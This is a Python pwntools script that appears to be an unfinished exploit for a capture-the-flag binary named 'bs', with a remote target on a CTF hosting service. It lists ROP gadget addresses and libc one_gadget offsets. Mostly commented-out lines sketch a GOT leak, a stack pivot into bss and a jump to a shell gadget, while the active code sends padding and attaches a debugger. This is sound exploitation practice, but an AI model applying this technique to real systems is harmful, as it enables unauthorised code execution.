#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bs')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bs')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',29723)
			elf=ELF('./bs')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		'''
		0x0000000000400c03 : pop rdi ; ret
		0x0000000000400c01 : pop rsi ; pop r15 ; ret
		0x0000000000400955 : leave ; ret
		'''
		prdi = 0x0000000000400c03
		prsip = 0x0000000000400c01
		leaveret = 0x0000000000400955
		libc.sym['one_gadget'] = 0x10a38c
		base = elf.bss() + 0x500

		#io.recv()
		# payload = flat('\0' * 0x1010, base - 0x8, prdi, elf.got['puts'], elf.plt['puts'])
		# payload += flat(prdi, 0, prsip, base, 0, elf.plt['read'])
		# payload += flat(leaveret)
		payload='a'
		payload = payload.ljust(0x1fff, '\0')

		io.sendlineafter("send?\n", str(0x2000))
		io.send(payload)

		# libc.address = u64(io.recvuntil('\x7f')[-6: ] + '\0\0') - libc.sym['puts']
		# success("libc", libc.address)
		# io.send(p64(libc.sym['one_gadget']))



		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue